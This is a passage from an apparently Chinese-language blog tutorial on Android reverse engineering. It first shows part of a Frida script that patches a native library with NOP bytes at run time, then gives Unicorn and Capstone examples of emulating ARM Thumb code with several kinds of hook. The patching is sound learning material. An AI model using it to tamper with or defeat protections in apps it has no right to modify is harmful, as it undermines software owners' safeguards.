class="string">&quot;--type:&quot;</span> + type);</span><br><span class="line">            <span class="keyword">if</span> (sopath.<span class="title function_">indexOf</span>(<span class="string">&quot;libnative-lib.so&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> libnativemodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> base = libnativemodule.<span class="property">base</span>;</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x8D8E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">                <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base_addr.<span class="title function_">add</span>(<span class="number">0x93CE</span>).<span class="title function_">add</span>(<span class="number">1</span>),<span class="number">4</span>,<span class="string">&quot;rxw&quot;</span>);</span><br><span class="line">                base_addr.<span class="title function_">add</span>(<span class="number">0x93CE</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;--------------------------------&quot;</span>)</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x8D8E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++&quot;</span>)</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x93C2</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">                <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base_addr.<span class="title function_">add</span>(<span class="number">0x949E</span>).<span class="title function_">add</span>(<span class="number">1</span>),<span class="number">4</span>,<span class="string">&quot;rxw&quot;</span>);</span><br><span class="line">                base_addr.<span class="title function_">add</span>(<span class="number">0x949E</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;========================&quot;</span>);</span><br><span class="line">                <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x93C2</span>).<span class="title function_">addad</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">          &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook);</span><br></pre></td></tr></table></figure><h2 id="第二课时">第二课时</h2><h3 id="unicorn简单模拟执行-add-R0-R1">unicorn简单模拟执行 add R0,R1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment">#.text:00012836 08 44                       ADD             R0, R1  ; Rd = Op1 + Op2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i))) <span class="comment">#利用寄存器序号输出寄存器的内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44&#x27;</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,size) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    mu.emu_start(address+<span class="number">1</span>,address+<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br></pre></td></tr></table></figure><h3 id="Unicorn的hook">Unicorn的hook</h3><p><img src="assets/image-20240504204827496.png" alt="image-20240504204827496"></p><h4 id="UC-HOOK-CODE">UC_HOOK_CODE</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):    <span class="comment">#打印ARM32下的所有寄存器内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);     </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):  <span class="comment">#定义的回调函数</span></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44&#x27;</span>  <span class="comment">#add R0,R1</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)  <span class="comment">#寄存器赋值</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)                        <span class="comment">#输出运行后的寄存器内容</span></span><br><span class="line">        <span class="comment">#bytes=mu.mem_read(0x0,4)   #打印内存中的值</span></span><br><span class="line">        <span class="comment">#print(&quot;ADDRESS:%x,0x:%s&quot; % (0x0, binascii.b2a_hex(bytes)))  # 转化为十六进制形式</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-MEM-WRITE">UC_HOOK_MEM_WRITE</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):      <span class="comment">##打印ARM32下的所有寄存器内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#void (*uc_cb_hookmem_t)(uc_engine *uc, uc_mem_type type,uint64_t address, int size, int64_t value, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE:   <span class="comment">#如果对内存操作是写</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ:    <span class="comment">#如果对内存操作是读</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90&#x27;</span>  <span class="comment">#ADD R0,R1  STR R0, [SP,#0xC+var_C]</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE,hook_mem)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))  <span class="comment">#不会执行 应为没有内存空间写数据(没有模拟这个虚拟空间)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="comment">#bytes=mu.mem_read(0x0,4)   #打印内存中的值</span></span><br><span class="line">        <span class="comment">#print(&quot;ADDRESS:%x,0x:%s&quot; % (0x0, binascii.b2a_hex(bytes)))  # 转化为十六进制形式</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-MEM-WRITE-UNMAPPED">UC_HOOK_MEM_WRITE_UNMAPPED</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):   <span class="comment">#打印arm下所有寄存器的内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED: <span class="comment">#如果对内存操作是写</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value)) <span class="comment">#写入的值应为R0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED: <span class="comment">#如果对内存操作是读</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))  </span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#映射一个空间存放栈数据</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#返回true 模拟器继续往下面执行代码  False则相反</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90&#x27;</span>  <span class="comment">#ADD R0,R1  STR R0, [SP,#0xC+var_C]</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="built_in">bytes</span>=mu.mem_read(<span class="number">0x0</span>,<span class="number">4</span>)   <span class="comment">#打印内存中的值  地址根据上面的hook_mem_unmapped数据存放的位置确定</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,0x:%s&quot;</span> % (<span class="number">0x0</span>, binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment"># 转化为十六进制形式</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-INTR">UC_HOOK_INTR</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):   <span class="comment">#打印arm下所有寄存器的内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookintr_t)(uc_engine *uc, uint32_t intno, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_syscall</span>(<span class="params">mu,intno,user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;syscall------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;syscall------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#映射</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#返回true 模拟器继续往下面执行代码  False则相反</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    <span class="comment">#ADD R0,R1  STR R0, [SP,#0xC+var_C] mov r7,1   SVC 0</span></span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90\x4f\xf0\x01\x07\x00\xdf&#x27;</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_INTR,hook_syscall)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="built_in">bytes</span> = mu.mem_read(<span class="number">0x0</span>, <span class="number">4</span>)  <span class="comment"># 打印内存中的值</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,0x:%s&quot;</span> % (<span class="number">0x0</span>, binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment"># 转化为十六进制形式</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="UC-HOOK-BLOCK">UC_HOOK_BLOCK</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 